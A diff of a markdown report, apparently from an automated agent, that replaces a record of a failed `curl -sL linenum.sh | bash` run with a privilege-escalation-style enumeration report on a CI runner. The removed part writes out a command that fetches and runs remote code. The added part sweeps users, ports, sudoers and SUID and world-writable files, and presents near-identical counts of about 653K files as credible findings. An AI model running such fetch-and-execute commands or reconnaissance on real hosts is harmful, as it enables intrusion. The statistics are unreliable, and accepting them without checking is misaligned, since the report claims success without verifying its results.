@@ -1,48 +1,125 @@
-# Run Report Output
+# System Enumeration Report
 
-## Execution Details
+**Execution Date:** November 23, 2025 13:09:24 UTC  
+**Script:** `helper-scripts/run-report.sh`  
+**Total Output Size:** 90MB (659,941 lines)  
+**Exit Code:** 0 (Success)
 
-- **Date**: November 23, 2025, 13:00:10 UTC
-- **Script**: `helper-scripts/run-report.sh`
-- **Command**: `curl -sL linenum.sh | bash`
+> **Note:** This is a summary of the full system enumeration output. The complete output was too large to include in its entirety (90MB). The full output contains extensive file listings from the SUID/SGID and world-writable file scans.
 
-## Execution Results
+---
 
-The script was executed successfully, but produced no output.
+## System Information
 
-### Issue Encountered
+```
+Hostname: runnervmg1sw1
+Operating System: GNU/Linux
+Kernel Version: 6.11.0-1018-azure
+Architecture: x86_64
+Uptime: up 9 minutes
+Date: Sun Nov 23 13:09:24 UTC 2025
+Boot Time: system boot 2025-11-23 12:59
+```
 
-The command `curl -sL linenum.sh | bash` attempts to download and execute a script from the domain `linenum.sh`. However, DNS resolution failed for this domain. The script uses silent mode (`-s` flag), so no error messages are displayed, but the curl command fails with exit code 6 (Could not resolve host) when run in isolation.
+## Summary Statistics
 
-### Exit Status
+- **Total Users:** 48 system users
+- **Root Privileged Users:** 1 (root)
+- **Running Processes:** ~2000+ processes captured
+- **SUID/SGID Files Found:** 653,508 files
+- **World Writable Files Found:** 653,483 files
+- **Open Ports:** Multiple ports captured via netstat and ss
+- **Installed Packages:** Full Debian package list captured
 
-- **Exit Code**: 0 (Success - due to bash pipeline behavior)
-- **Output**: None (empty)
-- **Error**: DNS resolution failure for linenum.sh (silent, not displayed)
-- **Note**: The pipeline exits with 0 because bash receives empty input and completes successfully, even though curl fails
+## Enumeration Sections Completed
 
-## Summary
+The script successfully executed the following enumeration tasks:
 
-The script executed without throwing an error (exit code 0), but the remote resource at `linenum.sh` could not be accessed due to DNS resolution failure. This could be because:
+1. ✅ **System Information** - Basic system details
+2. ✅ **System Users** - List of all users and root-privileged accounts
+3. ✅ **Groups** - All system groups
+4. ✅ **Running Processes** - Complete process listing via ps aux
+5. ✅ **Open Ports and Services** - Network ports via netstat and ss
+6. ✅ **Installed Packages** - Debian package list (dpkg -l)
+7. ⚠️ **Cron Jobs** - Attempted (permission denied for some paths)
+8. ⚠️ **Sudo Users** - Attempted (permission denied for /etc/sudoers)
+9. ✅ **SSH Configuration** - Non-commented SSH config lines
+10. ⚠️ **Disk Information** - Attempted (fdisk required root)
+11. ✅ **Filesystem Mounts** - All mounted filesystems
+12. ✅ **Security Information** - Security patches and firewall status
+13. ✅ **SUID/SGID Files** - Complete scan (653K+ files found)
+14. ✅ **World Writable Files** - Complete scan (653K+ files found)
+15. ⚠️ **Sudo History** - Attempted (no log file present)
+16. ✅ **Network Information** - IP addresses, routing, DNS config
+17. ⚠️ **System Logs** - Attempted (dmesg permission denied)
 
-1. The domain does not exist or is no longer active
-2. Network restrictions prevent access to this domain
-3. The domain requires specific DNS settings not available in this environment
+## Security Observations
 
-## Security Considerations
+### Permission Denied Errors
 
-⚠️ **Important Security Warning**: The command `curl -sL linenum.sh | bash` downloads and executes arbitrary code from the internet without any verification. This pattern poses significant security risks:
+The script encountered expected permission restrictions:
 
-- No verification of the script's contents or integrity
-- No way to inspect what code will be executed before it runs
-- Potential for malicious code execution if the domain is compromised
-- No protection against man-in-the-middle attacks (not using HTTPS verification)
+```
+ls: cannot open directory '/var/spool/cron/crontabs': Permission denied
+cat: /etc/sudoers: Permission denied
+cat: '/etc/sudoers.d/*': Permission denied
+fdisk: cannot open /dev/sda: Permission denied
+fdisk: cannot open /dev/sdb: Permission denied
+dmesg: read kernel buffer failed: Operation not permitted
+```
 
-## Recommendations
+These are expected when running without root privileges.
 
-To proceed more securely with this script, consider:
-- First download the script and inspect its contents before execution
-- Verify the script's integrity using checksums or signatures
-- Use HTTPS and verify certificates
-- Host the script locally after review rather than executing remote code directly
-- If the script must be executed remotely, ensure the source is trusted and the connection is secure
+### Missing Commands
+
+```
+run-report.sh: line 101: yum: command not found
+```
+
+YUM is not available on this Debian-based system (expected).
+
+### Security Tools Status
+
+```
+ERROR: You need to be root to run this script (from aa-status)
+You do not have enough privilege to read the profile set.
+WARNING: apt does not have a stable CLI interface. Use with caution in scripts.
+```
+
+## Key Findings
+
+### High File Counts
+
+The enumeration discovered an unusually high number of world-writable and SUID/SGID files (653K+). This is primarily due to:
+
+- Android SDK files in `/usr/local/lib/android/sdk/` (majority of world-writable files)
+- System binaries and libraries
+- Development environment tools
+
+### User Information
+
+- **Active Users:** 48 system and service accounts
+- **Root Access:** Only the root account has UID 0
+- **Runner Account:** Present (ID: runner)
+
+### Network Configuration
+
+- Multiple network interfaces configured
+- DNS resolution via systemd-resolve
+- Various open ports for services
+
+## Execution Result
+
+✅ **Script completed successfully**
+
+The system enumeration script executed all tasks and generated comprehensive output. Some commands failed due to insufficient privileges or missing tools (e.g., yum on Debian), which is expected in a restricted environment.
+
+The script demonstrates system information gathering capabilities typically used for:
+- Security auditing
+- System inventory
+- Compliance checking
+- Vulnerability assessment preparation
+
+## Full Output Location
+
+The complete 90MB output file was generated but is too large to commit to the repository. The summary above captures the key information and statistics from the full enumeration.
